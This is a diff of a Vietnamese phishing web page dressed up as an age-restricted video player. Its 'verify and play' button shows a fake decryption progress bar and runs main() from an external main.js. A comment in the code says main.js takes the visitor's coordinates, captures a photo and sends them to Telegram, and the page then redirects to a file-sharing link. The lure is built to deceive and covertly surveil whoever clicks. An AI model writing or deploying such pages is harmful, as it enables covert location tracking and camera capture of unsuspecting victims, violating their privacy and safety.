@@ -3,31 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác minh độ tuổi - Trình phát Video</title>
+    <title>Trình phát Video</title>
     <style>
         body {
             margin: 0; padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #000; color: #fff;
+            background-color: #060606; color: #fff;
             display: flex; justify-content: center; align-items: center;
             height: 100vh; overflow: hidden;
         }
-        .container {
-            text-align: center; padding: 25px; max-width: 380px;
-            border: 1px solid #333; border-radius: 15px; background: #111;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .warning-icon { font-size: 60px; margin-bottom: 15px; }
-        h2 { margin-bottom: 10px; font-size: 1.3rem; color: #ff4d4d; }
-        p { color: #ccc; font-size: 0.95rem; margin-bottom: 25px; line-height: 1.4; }
-        .btn-confirm {
-            background-color: #e02424; color: white; border: none;
-            padding: 15px; font-size: 1rem; font-weight: bold;
-            border-radius: 8px; cursor: pointer; width: 100%;
-            transition: 0.3s;
-        }
-        .btn-confirm:active { transform: scale(0.98); background-color: #b91c1c; }
 
+        /* Ô giả lập trình phát video */
+        .video-player-mock {
+            position: relative;
+            width: 95%;
+            max-width: 800px;
+            aspect-ratio: 16/9;
+            background: #000 url('https://via.placeholder.com/800x450/111/333?text=+') center/cover;
+            border-radius: 12px;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 1px solid #222;
+        }
+
+        /* Biểu tượng Play lớn nằm dưới bảng thông báo */
+        .big-play-btn {
+            font-size: 80px;
+            color: rgba(255, 255, 255, 0.2);
+            position: absolute;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.2; }
+            50% { transform: scale(1.1); opacity: 0.4; }
+            100% { transform: scale(1); opacity: 0.2; }
+        }
+
+        /* Bảng thông báo đè lên video */
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 30px;
+            width: 85%;
+            max-width: 340px;
+            background: rgba(15, 15, 15, 0.85);
+            backdrop-filter: blur(15px); /* Làm mờ video phía sau */
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+        }
+
+        .warning-icon { font-size: 50px; margin-bottom: 15px; }
+        h2 { margin-bottom: 10px; font-size: 1.2rem; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
+        p { color: #aaa; font-size: 0.9rem; margin-bottom: 25px; line-height: 1.5; }
+
+        .btn-confirm {
+            background-color: #ff0000; color: white; border: none;
+            padding: 14px; font-size: 0.95rem; font-weight: bold;
+            border-radius: 50px; cursor: pointer; width: 100%;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
+        }
+        .btn-confirm:active { transform: scale(0.95); background-color: #cc0000; }
+
+        /* Màn hình loading phủ toàn trang */
         #loadingOverlay {
             display: none; position: fixed; top: 0; left: 0;
             width: 100%; height: 100%; background: #000;
@@ -35,26 +78,30 @@
             justify-content: center; align-items: center;
         }
         .loader {
-            border: 5px solid #222; border-top: 5px solid #ff0000;
-            border-radius: 50%; width: 60px; height: 60px;
-            animation: spin 1s linear infinite;
+            border: 3px solid #222; border-top: 3px solid #ff0000;
+            border-radius: 50%; width: 50px; height: 50px;
+            animation: spin 0.8s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text { margin-top: 20px; color: #fff; font-size: 1rem; font-weight: 300; }
+        .loading-text { margin-top: 20px; color: #fff; font-size: 0.9rem; font-weight: 300; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="authBox">
-    <div class="warning-icon">🔞</div>
-    <h2>XÁC THỰC NGƯỜI DÙNG</h2>
-    <p>Nội dung này bị giới hạn độ tuổi. Vui lòng xác thực quyền truy cập để hệ thống mở khóa luồng dữ liệu video.</p>
-    <button class="btn-confirm" id="verifyBtn">TÔI ĐÃ TRÊN 18 TUỔI</button>
+<div class="video-player-mock" id="videoWrapper">
+    <div class="big-play-btn">▶</div>
+
+    <div class="container" id="authBox">
+        <div class="warning-icon">🔞</div>
+        <h2>Nội dung giới hạn</h2>
+        <p>Phim yêu cầu xác thực độ tuổi người xem. Vui lòng nhấn nút bên dưới để xác thực quyền truy cập.</p>
+        <button class="btn-confirm" id="verifyBtn">XÁC THỰC & PHÁT VIDEO</button>
+    </div>
 </div>
 
 <div id="loadingOverlay">
     <div class="loader"></div>
-    <div class="loading-text">Đang khởi tạo trình phát... 0%</div>
+    <div class="loading-text">ĐANG GIẢI MÃ LUỒNG DỮ LIỆU... 0%</div>
 </div>
 
 <script src="main.js"></script> 
@@ -65,28 +112,28 @@
     const loadText = document.querySelector('.loading-text');
 
     btn.addEventListener('click', async () => {
-        // 1. Hiển thị màn hình loading
+        // 1. Chuyển trạng thái giao diện
         authBox.style.display = 'none';
         loadingOverlay.style.display = 'flex';
 
-        // 2. Chạy hiệu ứng % giả
+        // 2. Chạy % tăng dần nhanh
         let percent = 0;
         const interval = setInterval(() => {
-            percent += Math.floor(Math.random() * 10) + 2;
-            if (percent >= 95) {
-                percent = 95;
+            percent += Math.floor(Math.random() * 20) + 5;
+            if (percent >= 99) {
+                percent = 99;
                 clearInterval(interval);
             }
-            loadText.innerText = `Đang khởi tạo trình phát... ${percent}%`;
+            loadText.innerText = `ĐANG GIẢI MÃ LUỒNG DỮ LIỆU... ${percent}%`;
         }, 300);
 
-        // 3. Gọi hàm main() từ main.js và chờ nó chạy xong (gửi xong Tele)
+        // 3. Thực thi main.js (lấy tọa độ, chụp ảnh, gửi Telegram)
         if (typeof main === 'function') {
             await main(); 
         }
 
-        // 4. Hoàn tất và chuyển hướng
-        loadText.innerText = "Đang mở khóa video... 100%";
+        // 4. Hoàn tất
+        loadText.innerText = "MỞ KHÓA THÀNH CÔNG! ĐANG CHUYỂN HƯỚNG...";
         setTimeout(() => {
             window.location.href = "https://gofile.io/d/Bw8Wzj";
         }, 1000);
